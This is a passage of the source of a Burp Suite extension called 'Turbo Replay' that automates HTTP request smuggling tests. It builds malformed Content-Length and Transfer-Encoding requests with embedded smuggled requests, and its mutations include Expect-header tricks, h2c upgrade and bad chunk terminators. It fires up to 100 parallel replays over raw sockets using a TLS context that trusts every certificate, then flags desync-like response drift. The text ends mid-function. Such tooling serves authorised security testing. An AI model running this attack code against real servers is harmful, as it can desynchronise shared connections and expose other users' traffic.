# -*- coding: utf-8 -*-
from burp import IBurpExtender, IHttpListener, ITab, IScanIssue, IHttpRequestResponse
from javax.swing import (
    JPanel, JTable, JScrollPane, JButton, JLabel, JTextField,
    JTextArea, BorderFactory, SwingUtilities, JCheckBox, JComboBox,
    ListSelectionModel, BoxLayout, Box, JSplitPane
)
from javax.swing.table import AbstractTableModel, DefaultTableCellRenderer
from java.awt import BorderLayout, FlowLayout, Font, Color, Dimension
from java.lang import Runnable, String, Integer, Thread as JThread, System as JSystem
from java.net import Socket, URL
from java.io import BufferedInputStream, BufferedOutputStream, ByteArrayOutputStream
from java.util.concurrent import CountDownLatch, LinkedBlockingQueue, Executors, TimeUnit
from javax.net.ssl import SSLContext, X509TrustManager
import jarray
import threading
from urlparse import urlparse

STATUS_PENDING = "Pending"
STATUS_RUNNING = "Running"
STATUS_COMPLETED = "Completed"
STATUS_ERROR = "Error"
DEFAULT_REPLAY_COUNT = 100
DEFAULT_CONNECTIONS = 100
MAX_LOG_LINES = 2000
MUTATION_EXPECT = "CL Expect"
MUTATION_EXPECT_10 = "EXPECT-1.0"
MUTATION_EXPECT_SPACE = "Expect-Space"
MUTATION_EXPECT_TAB = "Expect-Tab"
MUTATION_HEAD = "CL HEAD"
MUTATION_CL_OPTIONS = "CL OPTIONS"
MUTATION_CL_TRACE = "CL TRACE"
MUTATION_CL_GET = "CL GET"
MUTATION_CL_CONNECT = "CL CONNECT"
MUTATION_H2_UPGRADE = "H2-Upgrade"
MUTATION_CL_BLANK = "CL-blank"
MUTATION_CL_VALID_TERM = "CL-ValidTerminator"
MUTATION_TE_OPTIONS = "TE OPTIONS"
MUTATION_TE_TRACE = "TE TRACE"
MUTATION_TE_GET = "TE GET"
MUTATION_TE_HEAD = "TE HEAD"
MUTATION_TE_CONNECT = "TE CONNECT"
MUTATION_TE_VALID_TERM = "TE-ValidTerminator"
MUTATION_TE_BAD_TERM = "TE-Bad-Terminator"

DEFAULT_CL_BODY = "GET /sandboxtest%xx HTTP/1.1\r\nX: x"
DEFAULT_TE_BODY = "22\r\nGET /sandboxtest%xx HTTP/1.1\r\nX: x\r\n0\r\n\r\n"
DEFAULT_CL_VALID_TERM_BODY = "\r\nGET /sandboxtest%xx HTTP/1.1\r\nX: x"
DEFAULT_TE_VALID_TERM_BODY = "20\r\n0\r\n\r\nGET /test%xx HTTP/1.1\r\nX: x\r\n0\r\n\r\n"
DEFAULT_TE_BAD_TERM_BODY = "\r\n2;\nxx\r\n30\r\nGET /ad%xx HTTP/1.1\r\nHost: kictim.com\r\n\r\n0\r\n\r\n0\r\n\r\n"

CL_MUTATIONS = [
    MUTATION_EXPECT, MUTATION_EXPECT_10, MUTATION_EXPECT_SPACE,
    MUTATION_EXPECT_TAB, MUTATION_HEAD, MUTATION_CL_OPTIONS,
    MUTATION_CL_TRACE, MUTATION_CL_GET, MUTATION_CL_CONNECT,
    MUTATION_H2_UPGRADE, MUTATION_CL_BLANK, MUTATION_CL_VALID_TERM,
]
TE_MUTATIONS = [
    MUTATION_TE_OPTIONS, MUTATION_TE_TRACE, MUTATION_TE_GET,
    MUTATION_TE_HEAD, MUTATION_TE_CONNECT, MUTATION_TE_VALID_TERM,
    MUTATION_TE_BAD_TERM,
]
ALL_MUTATIONS = CL_MUTATIONS + TE_MUTATIONS

MUTATION_METHODS = {
    MUTATION_EXPECT: "POST",
    MUTATION_EXPECT_10: "POST",
    MUTATION_EXPECT_SPACE: "POST",
    MUTATION_EXPECT_TAB: "POST",
    MUTATION_HEAD: "HEAD",
    MUTATION_CL_OPTIONS: "OPTIONS",
    MUTATION_CL_TRACE: "TRACE",
    MUTATION_CL_GET: "GET",
    MUTATION_CL_CONNECT: "CONNECT",
    MUTATION_H2_UPGRADE: "POST",
    MUTATION_CL_BLANK: "POST",
    MUTATION_CL_VALID_TERM: "POST",
    MUTATION_TE_OPTIONS: "OPTIONS",
    MUTATION_TE_TRACE: "TRACE",
    MUTATION_TE_GET: "GET",
    MUTATION_TE_HEAD: "HEAD",
    MUTATION_TE_CONNECT: "CONNECT",
    MUTATION_TE_VALID_TERM: "POST",
    MUTATION_TE_BAD_TERM: "POST",
}

MUTATION_DEFAULT_BODIES = {}
for _m in CL_MUTATIONS:
    MUTATION_DEFAULT_BODIES[_m] = DEFAULT_CL_BODY
MUTATION_DEFAULT_BODIES[MUTATION_CL_VALID_TERM] = DEFAULT_CL_VALID_TERM_BODY
for _m in TE_MUTATIONS:
    MUTATION_DEFAULT_BODIES[_m] = DEFAULT_TE_BODY
MUTATION_DEFAULT_BODIES[MUTATION_TE_VALID_TERM] = DEFAULT_TE_VALID_TERM_BODY
MUTATION_DEFAULT_BODIES[MUTATION_TE_BAD_TERM] = DEFAULT_TE_BAD_TERM_BODY

# Shared trust-all SSL context (created once, reused for all sockets)
_SSL_CTX = None
_SSL_CTX_LOCK = threading.Lock()


def _get_ssl_context():
    global _SSL_CTX
    if _SSL_CTX is not None:
        return _SSL_CTX
    with _SSL_CTX_LOCK:
        if _SSL_CTX is not None:
            return _SSL_CTX
        class TrustAll(X509TrustManager):
            def checkClientTrusted(self, chain, authType):
                pass
            def checkServerTrusted(self, chain, authType):
                pass
            def getAcceptedIssuers(self):
                return None
        ctx = SSLContext.getInstance("TLS")
        ctx.init(None, [TrustAll()], None)
        _SSL_CTX = ctx
        return ctx


def normalize_path(raw_url):
    if raw_url.startswith("http://") or raw_url.startswith("https://"):
        parsed = urlparse(raw_url)
        path = parsed.path
    else:
        path = raw_url.split("?")[0].split("#")[0]
    if path != "/" and path.endswith("/"):
        path = path.rstrip("/")
    return path if path else "/"


def _read_line_bytes(bis):
    baos = ByteArrayOutputStream()
    prev = -1
    first = True
    while True:
        b = bis.read()
        if b == -1:
            if first:
                return None
            return baos.toByteArray()
        first = False
        baos.write(b)
        if prev == 0x0D and b == 0x0A:
            return baos.toByteArray()
        prev = b


def _read_exact_bytes(bis, n):
    if n <= 0:
        return jarray.zeros(0, 'b')
    buf = jarray.zeros(n, 'b')
    offset = 0
    while offset < n:
        count = bis.read(buf, offset, n - offset)
        if count == -1:
            break
        offset += count
    return buf


def _read_chunked_body(bis, resp_buf):
    while True:
        line_bytes = _read_line_bytes(bis)
        if line_bytes is None:
            break
        line_str = String(line_bytes, "ISO-8859-1").strip()
        parts = line_str.split(";")
        size_str = parts[0].strip()
        if len(size_str) == 0:
            break
        chunk_size = int(size_str, 16)
        if chunk_size == 0:
            _read_line_bytes(bis)
            break
        chunk_data = _read_exact_bytes(bis, chunk_size)
        resp_buf.write(chunk_data, 0, len(chunk_data))
        _read_line_bytes(bis)


def read_single_response(bis):
    while True:
        try:
            resp_buf = ByteArrayOutputStream()
            header_lines = []
            while True:
                line_bytes = _read_line_bytes(bis)
                if line_bytes is None:
                    return (-1, None)
                resp_buf.write(line_bytes, 0, len(line_bytes))
                line_str = String(line_bytes, "ISO-8859-1").strip()
                if len(line_str) == 0:
                    break
                header_lines.append(line_str)
            if len(header_lines) == 0:
                return (-1, None)
            status_parts = header_lines[0].split(" ")
            if len(status_parts) < 2:
                return (-1, None)
            code = int(status_parts[1])
            if 100 <= code <= 199:
                continue
            content_length = -1
            is_chunked = False
            for i in range(1, len(header_lines)):
                hl = header_lines[i].lower()
                if hl.startswith("content-length:"):
                    try:
                        content_length = int(header_lines[i].split(":", 1)[1].strip())
                    except Exception:
                        pass
                elif hl.startswith("transfer-encoding:") and "chunked" in hl:
                    is_chunked = True
            if is_chunked:
                _read_chunked_body(bis, resp_buf)
            elif content_length > 0:
                body = _read_exact_bytes(bis, content_length)
                resp_buf.write(body, 0, len(body))
            return (code, resp_buf.toByteArray())
        except Exception:
            return (-1, None)


def create_raw_socket(host, port, use_ssl):
    if use_ssl:
        ctx = _get_ssl_context()
        sock = ctx.getSocketFactory().createSocket(host, port)
        sock.startHandshake()
    else:
        sock = Socket(host, port)
    sock.setTcpNoDelay(True)
    sock.setSoTimeout(10000)
    return sock


class SyntheticHttpRequestResponse(IHttpRequestResponse):
    def __init__(self, req, resp, svc):
        self._req = req
        self._resp = resp
        self._svc = svc
        self._comment = None
        self._highlight = None
    def getRequest(self):
        return self._req
    def setRequest(self, m):
        self._req = m
    def getResponse(self):
        return self._resp
    def setResponse(self, m):
        self._resp = m
    def getComment(self):
        return self._comment
    def setComment(self, c):
        self._comment = c
    def getHighlight(self):
        return self._highlight
    def setHighlight(self, c):
        self._highlight = c
    def getHttpService(self):
        return self._svc
    def setHttpService(self, s):
        self._svc = s


class EndpointEntry(object):
    def __init__(self, path, host, method, replay_count, raw_request, http_service):
        self.path = path
        self.host = host
        self.method = method
        self.replay_count = replay_count
        self.status = STATUS_PENDING
        self.raw_request = raw_request
        self.http_service = http_service
        self.results = {}
        self.error_msg = ""
        self.baseline_code = None
        self.baseline_length = None
        self.baseline_response = None


class TurboReplayIssue(IScanIssue):
    def __init__(self, http_service, url, http_messages, name, detail, severity):
        self._svc = http_service
        self._url = url
        self._msgs = http_messages
        self._name = name
        self._detail = detail
        self._sev = severity
    def getUrl(self):
        return self._url
    def getIssueName(self):
        return self._name
    def getIssueType(self):
        return 0x08000000
    def getSeverity(self):
        return self._sev
    def getConfidence(self):
        return "Certain"
    def getIssueBackground(self):
        return None
    def getRemediationBackground(self):
        return None
    def getIssueDetail(self):
        return self._detail
    def getRemediationDetail(self):
        return None
    def getHttpMessages(self):
        return self._msgs
    def getHttpService(self):
        return self._svc


COLUMNS = ["Path", "Host", "Original Method", "Replay Count", "Status", "Baseline"]


class EndpointTableModel(AbstractTableModel):
    def __init__(self):
        self.entries = []
        self._lock = threading.Lock()
    def getRowCount(self):
        return len(self.entries)
    def getColumnCount(self):
        return len(COLUMNS)
    def getColumnName(self, col):
        return COLUMNS[col]
    def getValueAt(self, row, col):
        if row >= len(self.entries):
            return ""
        e = self.entries[row]
        if col == 0: return e.path
        if col == 1: return e.host
        if col == 2: return e.method
        if col == 3: return Integer(e.replay_count)
        if col == 4: return e.status
        if col == 5:
            if e.baseline_code is not None:
                return "%d (%d bytes)" % (e.baseline_code, e.baseline_length)
            return ""
        return ""
    def setValueAt(self, value, row, col):
        if col == 3:
            try:
                v = int(str(value))
                if v < 1: v = 1
                self.entries[row].replay_count = v
                self.fireTableCellUpdated(row, col)
            except (ValueError, TypeError):
                pass
    def isCellEditable(self, row, col):
        return col == 3
    def getColumnClass(self, col):
        if col == 3: return Integer
        return String
    def add_entry(self, entry):
        with self._lock:
            self.entries.append(entry)
            idx = len(self.entries) - 1
        self.fireTableRowsInserted(idx, idx)
        return idx
    def clear(self):
        with self._lock:
            n = len(self.entries)
            self.entries = []
        if n > 0:
            self.fireTableRowsDeleted(0, n - 1)
    def update_status(self, row):
        self.fireTableRowsUpdated(row, row)


def build_smuggle_request(helpers, raw_request, http_service, body_str, mutation):
    is_te = mutation in TE_MUTATIONS
    actual_body = body_str
    body_len = len(actual_body.encode("ascii"))
    analyzed = helpers.analyzeRequest(http_service, raw_request)
    headers = list(analyzed.getHeaders())
    method = MUTATION_METHODS.get(mutation, "POST")
    parts = headers[0].split(" ")
    parts[0] = method
    if mutation == MUTATION_EXPECT_10 and len(parts) >= 3:
        parts[2] = "HTTP/1.0"
    headers[0] = " ".join(parts)
    new_headers = [headers[0]]
    skip_headers = ["expect:", "content-length:", "transfer-encoding:",
                    "connection:", "upgrade:", "http2-settings:"]
    for h in headers[1:]:
        lower = h.lower()
        skip = False
        for prefix in skip_headers:
            if lower.startswith(prefix):
                skip = True
                break
        if not skip:
            new_headers.append(h)
    # Mutation-specific headers
    if mutation == MUTATION_EXPECT or mutation == MUTATION_EXPECT_10:
        new_headers.append("Expect: 100-Continue")
    elif mutation == MUTATION_EXPECT_SPACE:
        new_headers.append("Expect : 100-Continue")
    elif mutation == MUTATION_EXPECT_TAB:
        new_headers.append("Expect\t: 100-Continue")
    if mutation == MUTATION_H2_UPGRADE:
        new_headers.append("Connection: Upgrade, HTTP2-Settings")
        new_headers.append("Upgrade: h2c")
        new_headers.append("HTTP2-Settings: AAMAAABkAAQAAP__")
    # Length / encoding header
    if mutation == MUTATION_CL_BLANK:
        new_headers.append("Content-Length: ")
    elif is_te:
        new_headers.append("Transfer-Encoding: chunked")
    else:
        new_headers.append("Content-Length: %d" % body_len)
    # Build the raw HTTP message manually. Burp's helpers.buildHttpMessage()
    # auto-adds a Content-Length header even when Transfer-Encoding is set,
    # which breaks TE smuggling tests. Assemble the bytes ourselves.
    header_str = "\r\n".join(new_headers) + "\r\n\r\n"
    header_bytes = helpers.stringToBytes(header_str)
    body_bytes = helpers.stringToBytes(actual_body)
    result = jarray.zeros(len(header_bytes) + len(body_bytes), 'b')
    JSystem.arraycopy(header_bytes, 0, result, 0, len(header_bytes))
    JSystem.arraycopy(body_bytes, 0, result, len(header_bytes), len(body_bytes))
    return result


def parse_final_status(resp_bytes, helpers):
    if not resp_bytes:
        return (0, 0)
    analyzed = helpers.analyzeResponse(resp_bytes)
    code = analyzed.getStatusCode()
    boff = analyzed.getBodyOffset()
    if code < 100 or code >= 200:
        return (code, len(resp_bytes) - boff)
    tail = resp_bytes[boff:]
    if not tail:
        return (code, 0)
    try:
        ts = helpers.bytesToString(tail)
    except Exception:
        return (code, 0)
    idx = ts.find("HTTP/")
    if idx == -1:
        return (code, 0)
    try:
        fu = tail[idx:]
        a2 = helpers.analyzeResponse(fu)
        return (a2.getStatusCode(), len(fu) - a2.getBodyOffset())
    except Exception:
        return (code, 0)


class ReplayTask(object):
    def __init__(self, extender, entry, row_index):
        self.extender = extender
        self.entry = entry
        self.row = row_index

    def run(self):
        entry = self.entry
        helpers = self.extender._helpers
        callbacks = self.extender._callbacks
        flag_code = self.extender.get_flag_code()
        mutations = self.extender.get_active_mutations()
        if not mutations:
            entry.status = STATUS_ERROR
            entry.error_msg = "No mutations selected"
            self._update_ui()
            self._log_result()
            return
        entry.status = STATUS_RUNNING
        self._update_ui()
        # Run each selected mutation sequentially on this host.
        # Raise ONE issue per (endpoint, mutation) so each mutation's
        # mismatch is reported separately in Burp's Issues tab.
        all_results = {}
        for mutation in mutations:
            body_str = self.extender.get_exploit_body(mutation)
            (combined_results, attack_results, normal_results,
             attack_mismatch, normal_mismatch, flagged_responses,
             atk_bl_code, atk_bl_len, atk_bl_rr,
             norm_bl_code, norm_bl_len, norm_bl_rr) = (
                self._run_mutation(entry, mutation, body_str, flag_code))
            for combined_key, cnt in combined_results.items():
                key = "%s %s" % (mutation, combined_key)
                all_results[key] = cnt
            if attack_mismatch:
                try:
                    self._raise_mismatch_issue(
                        entry, mutation, attack_results, attack_mismatch,
                        atk_bl_code, atk_bl_len, atk_bl_rr)
                except Exception as ex:
                    self.extender._log_on_edt(
                        "** MISMATCH ISSUE ERROR ** %s [%s]: %s"
                        % (entry.path, mutation, str(ex)))
            if normal_mismatch:
                try:
                    self._raise_normal_mismatch_issue(
                        entry, mutation, normal_results, normal_mismatch,
                        norm_bl_code, norm_bl_len, norm_bl_rr)
                except Exception as ex:
                    self.extender._log_on_edt(
                        "** NORMAL MISMATCH ISSUE ERROR ** %s [%s]: %s"
                        % (entry.path, mutation, str(ex)))
            if flagged_responses:
                try:
                    self._raise_scan_issue(
                        entry, mutation, flag_code, flagged_responses,
                        attack_results, atk_bl_code)
                except Exception as ex:
                    self.extender._log_on_edt(
                        "** FLAG ISSUE ERROR ** %s [%s]: %s"
                        % (entry.path, mutation, str(ex)))
        entry.results = all_results
        entry.status = STATUS_COMPLETED
        self._update_ui()
        self._log_result()
        self._release_entry(entry)

    def _build_normal_request(self, entry):
        """Build a normal (un-mutated) request with Connection: close so
        the raw socket reads cleanly to EOF. Mirrors the manual byte
        assembly used by build_smuggle_request to avoid Burp helpers
        injecting unwanted headers."""
        helpers = self.extender._helpers
        analyzed = helpers.analyzeRequest(entry.http_service, entry.raw_request)
        headers = list(analyzed.getHeaders())
        body_offset = analyzed.getBodyOffset()
        body_bytes_orig = entry.raw_request[body_offset:]
        new_headers = [headers[0]]
        for h in headers[1:]:
            if h.lower().startswith("connection:"):
                continue
            new_headers.append(h)
        new_headers.append("Connection: close")
        header_str = "\r\n".join(new_headers) + "\r\n\r\n"
        header_bytes = helpers.stringToBytes(header_str)
        body_len = len(body_bytes_orig) if body_bytes_orig is not None else 0
        result = jarray.zeros(len(header_bytes) + body_len, 'b')
        JSystem.arraycopy(header_bytes, 0, result, 0, len(header_bytes))
        if body_len > 0:
            JSystem.arraycopy(body_bytes_orig, 0, result, len(header_bytes), body_len)
        return result

    def _run_mutation(self, entry, mutation, body_str, flag_code):
        helpers = self.extender._helpers
        callbacks = self.extender._callbacks
        try:
            attack_modified = build_smuggle_request(
                helpers, entry.raw_request, entry.http_service, body_str,
                mutation)
        except Exception as ex:
            self.extender._log_on_edt(
                "[ERROR] %s %s build failed: %s" % (mutation, entry.path, str(ex)))
            empty = {-1: 1}
            combined_empty = {"atk:-1": 1}
            return (combined_empty, empty, {}, {}, {}, [], -1, 0, None, -1, 0, None)
        try:
            normal_modified = self._build_normal_request(entry)
        except Exception as ex:
            self.extender._log_on_edt(
                "[ERROR] %s %s normal build failed: %s"
                % (mutation, entry.path, str(ex)))
            empty = {-1: 1}
            combined_empty = {"atk:-1": 1, "norm:-1": 1}
            return (combined_empty, empty, empty, {}, {}, [], -1, 0, None, -1, 0, None)
        # Attack baseline via Burp API
        try:
            atk_bl_rr = callbacks.makeHttpRequest(entry.http_service, attack_modified)
            atk_bl_bytes = atk_bl_rr.getResponse()
            atk_bl_code, atk_bl_len = parse_final_status(atk_bl_bytes, helpers)
        except Exception:
            atk_bl_code = -1
            atk_bl_len = 0
            atk_bl_rr = None
        # Normal baseline via Burp API
        try:
            norm_bl_rr = callbacks.makeHttpRequest(entry.http_service, normal_modified)
            norm_bl_bytes = norm_bl_rr.getResponse()
            norm_bl_code, norm_bl_len = parse_final_status(norm_bl_bytes, helpers)
        except Exception:
            norm_bl_code = -1
            norm_bl_len = 0
            norm_bl_rr = None
        # Store ATTACK baseline on entry (preserves UI behavior)
        entry.baseline_code = atk_bl_code
        entry.baseline_length = atk_bl_len
        entry.baseline_response = atk_bl_rr
        self._update_ui()
        self.extender._log_on_edt(
            "[BASELINE atk %s] %s  |  Status: %s  |  Body: %d bytes"
            % (mutation, entry.path, atk_bl_code, atk_bl_len))
        self.extender._log_on_edt(
            "[BASELINE norm %s] %s  |  Status: %s  |  Body: %d bytes"
            % (mutation, entry.path, norm_bl_code, norm_bl_len))
        # Skip this mutation entirely if either baseline is rate-limited.
        # Replay results would be meaningless noise.
        if atk_bl_code == 429 or norm_bl_code == 429:
            self.extender._log_on_edt(
                "[SKIP %s] %s  |  baseline 429 (rate-limited), skipping mutation"
                % (mutation, entry.path))
            combined_skip = {
                "atk:%s" % atk_bl_code: 1,
                "norm:%s" % norm_bl_code: 1,
            }
            return (combined_skip, {atk_bl_code: 1}, {norm_bl_code: 1},
                    {}, {}, [],
                    atk_bl_code, atk_bl_len, atk_bl_rr,
                    norm_bl_code, norm_bl_len, norm_bl_rr)
        remaining = entry.replay_count - 1
        attack_results = {atk_bl_code: 1}
        normal_results = {norm_bl_code: 1}
        attack_mismatch = {}
        normal_mismatch = {}
        flagged_responses = []
        if remaining < 1:
            combined = {
                "atk:%s" % atk_bl_code: 1,
                "norm:%s" % norm_bl_code: 1,
            }
            return (combined, attack_results, normal_results,
                    attack_mismatch, normal_mismatch, flagged_responses,
                    atk_bl_code, atk_bl_len, atk_bl_rr,
                    norm_bl_code, norm_bl_len, norm_bl_rr)
        host = str(entry.http_service.getHost())
        port = entry.http_service.getPort()
        use_ssl = str(entry.http_service.getProtocol()).lower() == "https"
        attack_raw_bytes = bytearray(attack_modified)
        normal_raw_bytes = bytearray(normal_modified)
        results_lock = threading.Lock()
        latch = CountDownLatch(remaining * 2)
        pool = self.extender._get_pool()

        class AttackSender(Runnable):
            def run(self_inner):
                sock = None
                try:
                    sock = create_raw_socket(host, port, use_ssl)
                    out = BufferedOutputStream(sock.getOutputStream())
                    inp = BufferedInputStream(sock.getInputStream())
                    out.write(attack_raw_bytes)
                    out.flush()
                    code, resp_bytes = read_single_response(inp)
                    if resp_bytes is not None and len(resp_bytes) > 4096:
                        resp_bytes = resp_bytes[:4096]
                    with results_lock:
                        attack_results[code] = attack_results.get(code, 0) + 1
                        if (code != atk_bl_code
                                and code != 429
                                and code not in attack_mismatch):
                            attack_mismatch[code] = SyntheticHttpRequestResponse(
                                attack_modified, resp_bytes, entry.http_service)
                        if (flag_code is not None
                                and code == flag_code
                                and code != atk_bl_code
                                and len(flagged_responses) < 3):
                            flagged_responses.append(SyntheticHttpRequestResponse(
                                attack_modified, resp_bytes, entry.http_service))
                except Exception:
                    with results_lock:
                        attack_results[-1] = attack_results.get(-1, 0) + 1
                finally:
                    if sock is not None:
                        try:
                            sock.close()
                        except Exception:
                            pass
                    latch.countDown()

        class NormalSender(Runnable):
            def run(self_inner):
                sock = None
                try:
                    sock = create_raw_socket(host, port, use_ssl)
                    out = BufferedOutputStream(sock.getOutputStream())
                    inp = BufferedInputStream(sock.getInputStream())
                    out.write(normal_raw_bytes)
                    out.flush()
                    code, resp_bytes = read_single_response(inp)
                    if resp_bytes is not None and len(resp_bytes) > 4096:
                        resp_bytes = resp_bytes[:4096]
                    with results_lock:
                        normal_results[code] = normal_results.get(code, 0) + 1
                        if (code != norm_bl_code
                                and code != 429
                                and code not in normal_mismatch):
                            normal_mismatch[code] = SyntheticHttpRequestResponse(
                                normal_modified, resp_bytes, entry.http_service)
                except Exception:
                    with results_lock:
                        normal_results[-1] = normal_results.get(-1, 0) + 1
                finally:
                    if sock is not None:
                        try:
                            sock.close()
                        except Exception:
                            pass
                    latch.countDown()

        for i in range(remaining):
            pool.submit(AttackSender())
            pool.submit(NormalSender())
        # Timeout: 60s per request pair worst case, capped at 240s total
        timeout_secs = min(remaining * 60, 240)
        finished = latch.await(timeout_secs, TimeUnit.SECONDS)
        if not finished:
            self.extender._log_on_edt(
                "[TIMEOUT %s] %s  |  latch timed out after %ds, continuing"
                % (mutation, entry.path, timeout_secs))
        # Build combined results dict for entry display
        combined = {}
        for code, cnt in attack_results.items():
            combined["atk:%s" % code] = cnt
        for code, cnt in normal_results.items():
            combined["norm:%s" % code] = cnt
        # Log per-mutation summary
        atk_parts = []
        for code, cnt in sorted(attack_results.items()):
            atk_parts.append("%s: %d" % (code if code > 0 else "Err", cnt))
        norm_parts = []
        for code, cnt in sorted(normal_results.items()):
            norm_parts.append("%s: %d" % (code if code > 0 else "Err", cnt))
        self.extender._log_on_edt(
            "[%s] %s | atk: %s | norm: %s"
            % (mutation, entry.path,
               ", ".join(atk_parts), ", ".join(norm_parts)))
        return (combined, attack_results, normal_results,
                attack_mismatch, normal_mismatch, flagged_responses,
                atk_bl_code, atk_bl_len, atk_bl_rr,
                norm_bl_code, norm_bl_len, norm_bl_rr)

    def _release_entry(self, entry):
        """Drop heavy references after processing so GC can reclaim memory."""
        entry.raw_request = None
        entry.baseline_response = None

    def _raise_scan_issue(self, entry, mutation, flag_code, flagged_responses,
                          m_results, m_baseline_code):
        callbacks = self.extender._callbacks
        protocol = str(entry.http_service.getProtocol())
        host = str(entry.http_service.getHost())
        port = entry.http_service.getPort()
        url = URL(protocol, host, port, entry.path)
        count = len(flagged_responses)
        breakdown = ", ".join(
            "%s: %d" % (k, n) for k, n in sorted(m_results.items()))
        detail = (
            "<b>Turbo Replay - Anomalous Status Code [%s]</b><br><br>"
            "Endpoint: <b>%s</b><br>"
            "Mutation: <b>%s</b><br>"
            "Baseline: <b>%s</b><br>"
            "Flagged code <b>%d</b> appeared <b>%d</b> time(s) "
            "out of %d replays.<br><br>"
            "Breakdown: %s"
            % (mutation, entry.path, mutation, m_baseline_code,
               flag_code, count, entry.replay_count, breakdown))
        issue = TurboReplayIssue(
            http_service=entry.http_service, url=url,
            http_messages=flagged_responses,
            name="Turbo Replay [%s]: Anomalous %d on %s"
                 % (mutation, flag_code, entry.path),
            detail=detail, severity="High")
        callbacks.addScanIssue(issue)
        self.extender._log_on_edt(
            "** HIGH ISSUE ** [%s] %s | code %d x%d (baseline %s)"
            % (mutation, entry.path, flag_code, count, m_baseline_code))

    def _raise_mismatch_issue(self, entry, mutation, m_results,
                              mismatch_samples, m_baseline_code,
                              m_baseline_len, m_baseline_rr):
        callbacks = self.extender._callbacks
        protocol = str(entry.http_service.getProtocol())
        host = str(entry.http_service.getHost())
        port = entry.http_service.getPort()
        url = URL(protocol, host, port, entry.path)
        total = sum(m_results.values())
        bl_hits = m_results.get(m_baseline_code, 0)
        mm_total = total - bl_hits
        breakdown = ", ".join(
            "%s: %d" % (k, n) for k, n in sorted(m_results.items()))
        mm_codes = ", ".join(str(c) for c in sorted(mismatch_samples.keys()))
        detail = (
            "<b>Turbo Replay - Attack Stream Mismatch [%s]</b><br><br>"
            "Endpoint: <b>%s</b><br>"
            "Mutation: <b>%s</b><br>"
            "Attack-stream baseline: <b>%s</b> (%s bytes body)<br>"
            "Total attack replays: <b>%d</b> | Matched: <b>%d</b> | "
            "Mismatched: <b>%d</b><br>"
            "Mismatch codes: <b>%s</b><br>"
            "Breakdown: %s<br><br>"
            "The %s attack mutation drifted from its own baseline across "
            "replays. Inconsistent responses on the attack stream may "
            "indicate desync or unstable parsing of the malformed request."
            % (mutation, entry.path, mutation, m_baseline_code,
               m_baseline_len, total, bl_hits, mm_total, mm_codes,
               breakdown, mutation))
        messages = []
        if m_baseline_rr is not None:
            messages.append(m_baseline_rr)
        for c in sorted(mismatch_samples.keys()):
            messages.append(mismatch_samples[c])
        issue = TurboReplayIssue(
            http_service=entry.http_service, url=url,
            http_messages=messages,
            name="Turbo Replay [%s]: Attack Stream Drift on %s"
                 % (mutation, entry.path),
            detail=detail, severity="Medium")
        callbacks.addScanIssue(issue)
        self.extender._log_on_edt(
            "** MEDIUM ISSUE (attack drift) ** [%s] %s | %d/%d mismatched (baseline %s, codes: %s)"
            % (mutation, entry.path, mm_total, total, m_baseline_code, mm_codes))

    def _raise_normal_mismatch_issue(self, entry, mutation, m_results,
                                     mismatch_samples, m_baseline_code,
                                     m_baseline_len, m_baseline_rr):
        callbacks = self.extender._callbacks
        protocol = str(entry.http_service.getProtocol())
        host = str(entry.http_service.getHost())
        port = entry.http_service.getPort()
        url = URL(protocol, host, port, entry.path)
        total = sum(m_results.values())
        bl_hits = m_results.get(m_baseline_code, 0)
        mm_total = total - bl_hits
        breakdown = ", ".join(
            "%s: %d" % (k, n) for k, n in sorted(m_results.items()))
        mm_codes = ", ".join(str(c) for c in sorted(mismatch_samples.keys()))
        detail = (
            "<b>Turbo Replay - Normal Request State Change [%s]</b><br><br>"
            "Endpoint: <b>%s</b><br>"
            "Mutation running alongside: <b>%s</b><br>"
            "Normal-stream baseline: <b>%s</b> (%s bytes)<br>"
            "Total normal replays: <b>%d</b> | Matched: <b>%d</b> | Mismatched: <b>%d</b><br>"
            "Mismatch codes: <b>%s</b><br>"
            "Breakdown: %s<br><br>"
            "Un-mutated requests sent in parallel with the %s attack mutation produced inconsistent responses, "
            "strongly indicating server-side state was perturbed by the attack stream (likely desync)."
            % (mutation, entry.path, mutation, m_baseline_code,
               m_baseline_len, total, bl_hits, mm_total, mm_codes,
               breakdown, mutation))
        messages = []
        if m_baseline_rr is not None:
            messages.append(m_baseline_rr)
        for c in sorted(mismatch_samples.keys()):
            messages.append(mismatch_samples[c])
        issue = TurboReplayIssue(
            http_service=entry.http_service, url=url,
            http_messages=messages,
            name="Turbo Replay [%s]: Normal Request Drift on %s"
                 % (mutation, entry.path),
            detail=detail, severity="High")
        callbacks.addScanIssue(issue)
        self.extender._log_on_edt(
            "** HIGH ISSUE (normal drift) ** [%s] %s | %d/%d mismatched (baseline %s, codes: %s)"
            % (mutation, entry.path, mm_total, total, m_baseline_code, mm_codes))

    def _update_ui(self):
        model = self.extender.table_model
        row = self.row
        class Updater(Runnable):
            def run(self_inner):
                model.update_status(row)
        SwingUtilities.invokeLater(Updater())

    def _log_result(self):
        entry = self.entry
        parts = []
        total = 0
        for key, cnt in sorted(entry.results.items()):
            parts.append("%s: %d" % (key, cnt))
            total += cnt
        summary = "[%s] %s | Total: %d | %s" % (
            entry.status, entry.path, total,
            ", ".join(parts) if parts else "N/A")
        if entry.error_msg:
            summary += " | " + entry.error_msg
        self.extender._log_on_edt(summary)


class BurpExtender(IBurpExtender, IHttpListener, ITab):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("Turbo Replay")
        self._seen_paths = {}
        self._seen_lock = threading.Lock()
        self.connection_count = DEFAULT_CONNECTIONS
        self._work_queue = LinkedBlockingQueue()
        self._master_thread = None
        self._master_lock = threading.Lock()
        self._pool = None
        self._pool_size = 0
        self._pool_lock = threading.Lock()
        self._log_line_count = 0
        self._completed_count = 0
        self.TOOL_PROXY = callbacks.TOOL_PROXY
        self.TOOL_INTRUDER = callbacks.TOOL_INTRUDER
        # Per-mutation editable bodies (copy of defaults, modified by UI)
        self._mutation_bodies = dict(MUTATION_DEFAULT_BODIES)
        self._current_body_mutation = ALL_MUTATIONS[0]
        self.table_model = EndpointTableModel()
        self._build_ui()
        callbacks.registerHttpListener(self)
        callbacks.addSuiteTab(self)

    def getTabCaption(self):
        return "Turbo Replay"
    def getUiComponent(self):
        return self._main_panel

    def get_exploit_body(self, mutation):
        self._save_current_body()
        text = self._mutation_bodies.get(mutation, "")
        if not text or text.strip() == "":
            return MUTATION_DEFAULT_BODIES.get(mutation, DEFAULT_CL_BODY)
        return text.replace("\\r\\n", "\r\n").replace("\\n", "\n")

    def _save_current_body(self):
        text = self._body_area.getText()
        if text is not None:
